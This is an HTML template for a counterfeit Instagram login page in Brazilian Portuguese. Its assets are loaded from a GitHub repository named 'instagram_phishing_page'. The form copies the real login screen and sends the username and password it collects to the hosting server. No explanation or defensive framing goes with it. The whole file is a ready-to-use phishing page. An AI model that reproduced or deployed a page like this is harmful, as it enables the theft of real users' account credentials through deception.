<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="../static/styles.css" />
  <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/Jamalo-TV/instagram_phishing_page/refs/heads/main/static/insta-fav.ico">
  <title>Instagram</title>
</head>
<body>
<main class="flex align-items-center justify-content-center">
  <section id="auth" class="flex direction-column">
    <div class="panel login flex direction-column">
      <h1 title="Instagram" class="flex justify-content-center">
        <img src="https://github.com/Jamalo-TV/instagram_phishing_page/blob/main/static/instagram-logo.png?raw=true" alt="Instagram logo" title="Instagram logo" />
      </h1>
      <form id="login-form" action="/" method="post">
        <label for="username" class="sr-only">Telefone, nome de usuário ou e-mail</label>
        <input type="text" id="username" name="username" placeholder="Telefone, nome de usuário ou e-mail" required>

        <label for="password" class="sr-only">Senha</label>
        <input id="password" name="password" type="password" placeholder="Senha" required>

        <button id="submit-button" type="submit">Entrar</button>
        <p id="status-message" style="display: none;">Aguarde...</p>
      </form>

      <p id="response-message" style="color: red; display: none;"></p>
      <div class="flex separator align-items-center">
        <span></span>
        <div class="or">OU</div>
        <span></span>
      </div>
      <div class="login-with-fb flex direction-column align-items-center">
        <div>
          <img alt="Facebook logo" />
          <a href="#">Entrar com Facebook</a>
        </div>
        <a href="#">Esqueceu a senha?</a>
      </div>
    </div>
    <div class="panel register flex justify-content-center">
      <p>Não tem uma conta?</p>
      <a href="#">Cadastre-se</a>
    </div>
    <div class="app-download flex direction-column align-items-center">
      <p>Instale o aplicativo</p>
      <div class="flex justify-content-center">
        <img src="https://github.com/Jamalo-TV/instagram_phishing_page/blob/main/static/apple-button.png?raw=true" alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
        <img src="https://github.com/Jamalo-TV/instagram_phishing_page/blob/main/static/googleplay-button.png?raw=true" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
      </div>
    </div>
  </section>
</main>

</html>
